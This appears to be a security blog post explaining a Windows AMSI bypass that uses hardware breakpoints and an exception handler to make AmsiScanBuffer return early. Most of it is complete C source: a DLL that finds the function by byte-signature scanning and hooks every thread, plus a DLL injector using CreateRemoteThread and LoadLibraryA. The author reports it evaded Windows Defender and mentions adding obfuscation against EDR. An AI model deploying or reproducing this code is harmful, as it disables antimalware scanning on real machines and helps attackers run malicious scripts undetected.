---
title: Frida vs. AMSI - Beyond Prototyping
description: We broke AMSI in theory, but now let's turn it into a real exploit!
---

# Frida vs. AMSI - Beyond Prototyping

In my [previous article on bypassing AMSI](/blogs/frida-vs-amsi), I discussed various approaches to disabling AMSI on a Windows system - by hooking and intercepting key functions, by patching them in memory, or by corrupting the data structures that AMSI relies on to function. 

All of these techniques are certainly effective, and Frida was a great tool for rapidly implementing and experimenting with them.

However, none of them are particularly stealthy. Patching a process in memory is a fairly noisy activity. While it might not get picked up by *every* EDR as long as you're not using signatured tooling, any EDR with a robust behavioural analysis function is likely to flag this as suspicious behaviour.

In this article, I'll describe another approach to patching AMSI. I also hope to further demonstrate Frida's usefulness as a rapid prototyping tool, as it was my earlier research using Frida that brought me here in the first place.

## Patchless Patching

The basic idea is still the same: we're still patching the *AmsiScanBuffer()* function to short-circuit its functionality. In this case, we're going to simply redirect execution to the RET instruction at the end of *AmsiScanBuffer()* whenever it gets invoked. The function will return instantly with a default return value of 0.

If you want more background on that, check out the previous article linked above.

The way we're going to execute that patch is different, however. We're going to use hardware breakpoints to intercept *AmsiScanBuffer()*, a technique I can't take credit for. I learned about it from an article in [VXUnderground Black Mass Halloween 2022](https://vx-underground.org/Papers/Other/VXUG%20Zines), which I highly recommend for any detection-averse hackers who know their way around C. It's a great read.

The basic idea works as follows:

1. Create a DLL which must be injected or otherwise loaded by the process you want to patch AMSI for. 
2. Within *DllMain()*, identify the memory address of *DllCanUnloadNow()* in the mapped version of AMSI.DLL.
3. Use egg-hunting techniques to scan forward from *DllCanUnloadNow()*, searching for the start of *AmsiScanBuffer()*. This indirect approach helps with evasion, as per the **@am0nsec** implementation.
4. Manipulate debug registers to set a hardware breakpoint on the address of *AmsiScanBuffer()*. When the function is invoked, a special exception will be thrown.
5. Register an exception handler which simply redirects execution to the end of the function.

As with other egg-hunting AMSI patching techniques, this approach is somewhat fragile as the specific signatures we're searching for will change between different versions of Windows.
## Proof of Concept

Note that this is only a proof of concept and hasn't been tested extensively. Here's what it looks like:

```c
#include <windows.h>
#include <sys/types.h>
#include <processthreadsapi.h>
#include <stdio.h>
#include <tlhelp32.h>

// AMSI Bypass DLL via Hardware Breakpoints
// Find some way to load or inject this DLL into your process and it will hook AmsiScanBuffer().
// Compilation: x86_64-w64-mingw32-gcc amsi-breakpoint.c -shared -o  amsi-breakpoint.dll

// A simple memory scanner for the purpose of finding ROP gadgets.
uintptr_t find_egg(uintptr_t addr, char *egg, int size, int max)
{
    for (int i = 0; i < max; i++)
    {
        if (memcmp((LPVOID)(addr + i), egg, size) == 0) {
            return (addr + i);
        }
    }
    return 0;
}

// Exception handler that gets invoked when the breakpoints trigger.
// It uses find_egg() to identify the RET instruction at the end of AmsiScanBuffer() and redirect execution to it.
// This effectively patches the function to return 0.
LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {
	// Validate that it's a single-step exception, thrown by the hardware breakpoint.
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
		// Search forwards from the current location for a RET instruction and move the instruction pointer to it.
		uintptr_t rip = ExceptionInfo->ContextRecord->Rip;
		uintptr_t newrip = find_egg(rip, "\xc3", 1, 500);
		ExceptionInfo->ContextRecord->Rip = newrip;
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

// Set a hardware breakpoint on a thread by manipulating the debug registers of its thread context.
BOOL set_hardware_breakpoint(HANDLE thd, uintptr_t address) {
	CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	GetThreadContext(thd, &context);
	
	// set the breakpoint address
	context.Dr0 = (uintptr_t) address;

	// set bits 0 and 1 of dr7 to '10' (enable dr0 local breakpoint)
	context.Dr7 |= 1ull << 0;
	context.Dr7 &= ~(1ull << 1);

	// set bits 16 and 17 of dr7 to '00' (set dr0 break trigger to "execute")
	context.Dr7 &= ~(1ull << 16);
	context.Dr7 &= ~(1ull << 17);

	// set bits 18 and 19 of dr7 to '00' (set dr0 break size to 1 byte)
	context.Dr7 &= ~(1ull << 18);
	context.Dr7 &= ~(1ull << 19);	

	return SetThreadContext(thd, &context);
}


// Remove a hardware breakpoint on a thread by manipulating the debug registers of its thread context.
BOOL remove_hardware_breakpoint(HANDLE thd) {
	CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	GetThreadContext(thd, &context);
	
	// unset the breakpoint address
	context.Dr0 = 0ull;
	
	// unset bit 0 of dr7
	context.Dr7 &= ~(1ull << 0);
	
	return SetThreadContext(thd, &context);
}

// Iterate through the threads associated with a process and hook all of them with hardware breakpoints.
void hook_process(DWORD pid, uintptr_t addr) {
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
	Thread32First(h, &te);

	do {
		if (te.th32OwnerProcessID == pid && (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))) {
			HANDLE thd = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			BOOL res = set_hardware_breakpoint(thd, addr);
			if (res) {
				printf("Hooked 0x%p on thread %i\n", addr, te.th32ThreadID);
			}
		}
	} while (Thread32Next(h, &te));

	CloseHandle(h);		
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	const PVOID handler = AddVectoredExceptionHandler(1, ExceptionHandler);	
	const DWORD pid = GetCurrentProcessId();
	
	// Find the target address using a signature-based technique for evasion. Signature may need to be updated for different Windows versions.
	char *egg = "\x4C\x8B\xDC\x49\x89\x5B\x08\x49\x89\x6B\x10\x49\x89\x73\x18\x57\x41\x56\x41\x57\x48\x83\xEC\x70";
	uintptr_t base = (uintptr_t)GetProcAddress(GetModuleHandleW(L"AMSI.dll"), "DllCanUnloadNow");
	uintptr_t addr = find_egg(base, egg, 24, 65535);

	switch(fdwReason) {
		case DLL_PROCESS_ATTACH:
			// Hook the target address.	
			hook_process(pid, addr);
			break;
		
		break;
	}
	
	return TRUE;
}
```

For testing purposes, you can use the following "injector" to load the DLL into memory:

```c
#include <windows.h>
#include <sys/types.h>

void dll_inject(char *dll_path, pid_t pid) {
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

	void *ptr = VirtualAllocEx(proc, 0, strlen(dll_path), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(proc, ptr, dll_path, strlen(dll_path), 0);

	void *kernel32 = GetModuleHandle(TEXT("kernel32.dll"));
	void *loadLibAddr = GetProcAddress(kernel32, "LoadLibraryA");
	CreateRemoteThread(proc, NULL, 0, loadLibAddr, ptr, 0, NULL);	
}

void main() {
	dll_inject("C:\\Users\\IEUser\\Downloads\\amsi-breakpoint.dll", 2768);
}
```

Upon running `inject.exe` with the correct path and the PID of your Powershell process, you should find that AMSI has been disabled for it.

![a screenshot that demonstrates the breakpoint AMSI bypass](/img/amsi-breakpoint.png)

## Conclusion

I won't be publishing the code for this AMSI bypass elsewhere, as I haven't tested it extensively enough to be sure it functions reliably. On my Windows 10 testing VM, though, it was enough to bypass AMSI without triggering the (non-enterprise) Windows Defender present on the system.

Breakpoint hooking is a technique I have injected from elsewhere (pun intended), but everything else I did here builds on what I learned in my previous article. I think it's a great illustration of how you can use reverse engineering and instrumentation tools to go from idea to prototype, and then prototype to proof of concept.

I might now go from proof of concept to finished tooling, with a bit more obfuscation included to throw off EDR from the bits that might trigger a signature. Tools like this tend to get burned pretty quickly when you release them in public, though, so I'll probably be keeping any further development on this one to myself. 